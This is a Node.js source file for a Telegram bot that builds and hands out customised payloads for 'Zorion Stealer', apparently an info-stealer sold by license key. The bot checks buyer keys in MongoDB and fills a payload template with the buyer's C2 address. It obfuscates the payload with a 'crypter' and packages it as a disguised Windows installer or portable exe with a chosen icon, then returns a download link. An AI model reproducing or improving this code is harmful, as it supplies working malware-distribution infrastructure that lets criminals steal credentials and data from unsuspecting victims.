const TelegramBot = require('node-telegram-bot-api');
const FormData = require('form-data');
const fs = require('fs-extra');
const axios = require('axios');
const { exec } = require('child_process');
const { MongoClient } = require('mongodb');
const os = require('os');
const username = os.userInfo().username;
const path = require('path');
const config = require(path.join('C:', 'Users', username, 'Desktop', 'Zorion Stealer', 'config.json'));
const uri = config.mongodbdbnamesiz;
const dbName = config.mongodbdbname;
const bot = new TelegramBot(config.buildertoken, { polling: true });
const crypto = require('crypto');

let exeName; 
let usrkey;

async function readFile(filePath) {
    const data = await fs.readFile(filePath, { encoding: 'utf8' });
    return data;
}

async function writeFile(filePath, data) {
    await fs.writeFile(filePath, data, 'utf8');
}

async function executeCommand(command) {
    return new Promise((resolve, reject) => {
        exec(command, (error, stdout, stderr) => {
            if (error) {
                reject(error);
            } else {
                resolve({ stdout, stderr });
            }
        });
    });
}

async function updateIconFiles(Key) {
    const iconFolderPath = path.join(__dirname, 'icon');
    const iconFileName = `${Key}.ico`;
    const iconFilePath = path.join(iconFolderPath, iconFileName);

    if (fs.existsSync(iconFilePath)) {
        const packageJsonPathScript = path.join(__dirname, 'crypter', 'script', 'package.json');
        const packageJsonScript = require(packageJsonPathScript);
        packageJsonScript.build.win.icon = `${Key}.ico`;
        fs.writeFileSync(packageJsonPathScript, JSON.stringify(packageJsonScript, null, 2));

        const sourceFilePath = path.join(__dirname, 'icon', `${Key}.ico`);
        const destinationPath = path.join(__dirname, 'crypter', 'script', `${Key}.ico`);
        fs.copyFileSync(sourceFilePath, destinationPath);

        console.log(`Icon files updated for ${Key}.`);
    } else {
        const packageJsonPathScript = path.join(__dirname, 'crypter', 'script', 'package.json');
        const packageJsonScript = require(packageJsonPathScript);
        packageJsonScript.build.win.icon = `node.ico`;
        fs.writeFileSync(packageJsonPathScript, JSON.stringify(packageJsonScript, null, 2));

        console.log(`Icon file not found for ${Key}. Using default icon.`);
    }
}


async function updatePackageJsonSERCAN(randomName, bOption) {
    try {
        const packageJsonPath = "./crypter/script/package.json";

        const packageJsonContent = await fs.promises.readFile(packageJsonPath, 'utf8');
        let packageJson = JSON.parse(packageJsonContent);

        // package.json yapısının doğru olduğundan emin olun
        if (!packageJson.build || !packageJson.build.win) {
            throw new Error('Invalid package.json structure: build.win not found');
        }

        // main alanını güncelle
        packageJson.main = `${randomName}.js`;

        // build hedefini güncelle
        if (bOption === "nsis") {
            packageJson.build.win.target = "nsis";
        } else if (bOption === "portable") {
            packageJson.build.win.target = "portable";
        } else if (bOption === "msi") {
            packageJson.build.win.target = "msi";
        } else {
            throw new Error('Invalid build option');
        }

        // Güncellenen package.json içeriğini konsola yazdırma
        console.log('Updated package.json:', packageJson);

        // Güncellenmiş package.json dosyasını yazma
        await fs.promises.writeFile(packageJsonPath, JSON.stringify(packageJson, null, 2));
        console.log("package.json updated successfully");

    } catch (error) {
        console.error('An error occurred while updating package.json:', error);
    }
}

async function buildFile(key, exeName, chatId, bOption) {
    const filePath = './crypter/payload.js';
    const modifiedFilePath = './crypter/payload1.js';

    try {
        console.log(key + + " " + "Build aliyor.")
        let data = await fs.readFile(filePath, 'utf8');
        data = data.replace(/namehere/g, exeName).replace(/keyhere/g, key).replace(/C2_IP/g, config.ip);    
        await fs.writeFile(modifiedFilePath, data);
        console.log('Payload file successfully updated.');

        // Generate a random name for the obfuscated script
        const randomName = crypto.randomBytes(8).toString('hex');
        const obfuscatedScriptPath = `./crypter/script/${randomName}.js`;

        console.log(randomName, bOption);


        updatePackageJsonSERCAN(randomName, bOption);

        const nodeCommand = `node --max-old-space-size=4096 "C:/Users/${config.pcname}/Desktop/Zorion Stealer/Bot/crypter/obfuscator.js" ${randomName}.js`;
        const { stdout, stderr } = await executeCommand(nodeCommand);
        console.log('Node.js command STDOUT:', stdout);
        console.log('Node.js command STDERR:', stderr);

        await executeCommand(`cd ./crypter/script && npm run build`);

        await fs.rmdir("./crypter/script/dist/win-unpacked", { recursive: true });
        await fs.unlink(modifiedFilePath);
        await fs.unlink(path.join('./crypter/script', `${randomName}.js`));

            await STEP2(exeName, chatId, bOption);
    } catch (error) {
        console.error('An error occurred:', error);
        await bot.sendMessage(chatId, `❌ An error occurred: ${error.message}`);
    }
}

async function STEP2(exeName, chatId, bOption) {
    try {
        if (bOption === "nsis") {
            const sourceFilePath = path.resolve('./crypter/script/dist', `${exeName} Setup 1.0.0.exe`);
            const targetFilePath = `C:/Users/${config.pcname}/Desktop/Zorion Stealer/Api/output/${exeName}.exe`;
            await fs.promises.copyFile(sourceFilePath, targetFilePath);
            console.log(`File copied to ${targetFilePath}`);
    
            await bot.sendMessage(chatId, `You can access your compiled application here. ✔
> [download here!](https://${config.domain}/downloadapp/${exeName}.exe)`, { parse_mode: 'Markdown' });
            await fs.promises.rmdir("./crypter/script/dist/", { recursive: true });        }

        if (bOption === "portable") {
            const sourceFilePath = path.resolve('./crypter/script/dist', `${exeName} 1.0.0.exe`);
            const targetFilePath = `C:/Users/imnothuman/Desktop/Api/output/${exeName}.exe`;
            await fs.promises.copyFile(sourceFilePath, targetFilePath);
            console.log(`File copied to ${targetFilePath}`);
    
            await bot.sendMessage(chatId, `You can access your compiled application here. ✔
> [download here!](https://${config.domain}/downloadapp/${exeName}.exe)`, { parse_mode: 'Markdown' });
            await fs.promises.rmdir("./crypter/script/dist/", { recursive: true });       
         }
            if (bOption === "msi") {
                const sourceFilePath = path.resolve('./crypter/script/dist', `${exeName} 1.0.0.msi`);
                const targetFilePath = `C:/Users/imnothuman/Desktop/Api/output/${exeName}.msi`;
                await fs.promises.copyFile(sourceFilePath, targetFilePath);
                console.log(`File copied to ${targetFilePath}`);
        
            await bot.sendMessage(chatId, `You can access your compiled application here. ✔
> [download here!](https://${config.domain}/downloadapp/${exeName}.exe)`, { parse_mode: 'Markdown' });
                await fs.promises.rmdir("./crypter/script/dist/", { recursive: true });        }
          
    } catch (error) {
        console.error('An error occurred:', error);
        await bot.sendMessage(chatId, `❌ An error occurred: ${error.message}`);
    }
}

const buildQueue = [];
let isBuilding = false;

async function startNextBuild(exeName, chatId, usrkey, bOption) {
    if (!isBuilding) {
        try {
            const client = new MongoClient(uri, { useNewUrlParser: true, useUnifiedTopology: true });
            await client.connect();
            const db = client.db(dbName);
            const collection = db.collection('keys');
            const doc = await collection.findOne({ Key: usrkey });

            if (doc) {
                isBuilding = true;
                await bot.sendMessage(chatId, 'The process has been started.');
                const updatePackageJson = async (filePath) => {
                    const packageJSON = await readFile(filePath);
                    const parsedPackageJSON = JSON.parse(packageJSON);
                    parsedPackageJSON.name = `${exeName}`;
                    await writeFile(filePath, JSON.stringify(parsedPackageJSON, null, 2));
                    console.log('name written to', filePath);
                };
                const Key = usrkey;
                updateIconFiles(Key);
                await updatePackageJson('./crypter/script/package.json');
                await buildFile(usrkey, exeName, chatId, bOption);
                await bot.sendMessage(chatId, 'The process completed successfully.');
                fs.removeSync(`./crypter/script/${usrkey}.ico`);
            } else {

                await bot.sendMessage(chatId, 'invalid key');
            }
        } catch (error) {
            console.error('An error occurred:', error);
            await bot.sendMessage(chatId, `❌: ${error.message}`);
        } finally {
            isBuilding = false;
        }
    } else {
        await bot.sendMessage(chatId, 'The bot is currently busy, please try again in 1/2 minutes.');
    }
}


const cooldownPeriod = 60000; // 1 minute cooldown
let lastBuildCommandTime = 0;
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (!text) {
        console.error(`Received a message without text from chat id: ${chatId}`);
        return;
    }

    lastBuildCommandTime = Date.now();

    if (text === '/start') {
        await bot.sendMessage(chatId, 'use: /build <yourkey>');
        return;
    }

    if (text.startsWith('/build ')) {
        const commandParts = text.split(' ');
        if (commandParts.length !== 2) {
            await bot.sendMessage(chatId, 'use: /build <yourkey>');
            return;
        }

        const [command, usrkey] = commandParts;

        if (isBuilding) {
            await bot.sendMessage(chatId, 'The bot is currently busy, please try again in 1/2 minutes.');
            return;
        }

        const client = new MongoClient(uri);

        try {
            await client.connect();
            const db = client.db(dbName);
            const collection = db.collection('keys');

            console.log(`Querying for key: ${usrkey}`); // Debugging line
            const doc = await collection.findOne({ Key: usrkey.toUpperCase() });

            if (!doc) {
                console.log(`Key not found in database: ${usrkey}`); // Debugging line
                await bot.sendMessage(chatId, 'Invalid key');
                return;
            }

            console.log(`Key found: ${JSON.stringify(doc)}`); // Debugging line

            // Ask for exeName
            await bot.sendMessage(chatId, 'What is the name of the exe you want to create?');

            const timeoutDuration = 10000; // 10 seconds

            const exeNameHandler = async (msg) => {
                clearTimeout(exeNameTimeout);
                const exeName = msg.text.toLowerCase();
                if (exeName) {
                    await bot.sendMessage(chatId, 'What type of exe do you want to create? (nsis, portable, msi)');

                    const buildOptionHandler = async (msg) => {
                        clearTimeout(buildOptionTimeout);
                        const buildOption = msg.text.toLowerCase();

                        if (buildOption !== 'nsis' && buildOption !== 'portable' && buildOption !== 'msi') {
                            await bot.sendMessage(chatId, `Invalid type. Only use: 'nsis', 'portable', or 'msi'`);
                            return;
                        }

                        // Remove listeners after processing
                        bot.removeListener('message', exeNameHandler);
                        bot.removeListener('message', buildOptionHandler);

                        startNextBuild(exeName, chatId, usrkey, buildOption);
                    };

                    // Listen for build option after exe name is provided
                    bot.once('message', buildOptionHandler);

                    // Set timeout for build option
                    const buildOptionTimeout = setTimeout(() => {
                        bot.sendMessage(chatId, 'The questions asked were not answered within 10 seconds, the transaction has timed out, please use the command again.');
                        bot.removeListener('message', buildOptionHandler);
                    }, timeoutDuration);
                } else {
                    await bot.sendMessage(chatId, 'Please provide a valid exe name.');
                }
            };

            // Listen for exe name
            bot.once('message', exeNameHandler);

            // Set timeout for exe name
            const exeNameTimeout = setTimeout(() => {
                bot.sendMessage(chatId, 'The questions asked were not answered within 10 seconds, the transaction has timed out, please use the command again.');
                bot.removeListener('message', exeNameHandler);
            }, timeoutDuration);

        } catch (error) {
            console.error('An error occurred:', error);
            await bot.sendMessage(chatId, `❌: ${error.message}`);
        } finally {
            await client.close();
        }
    }
});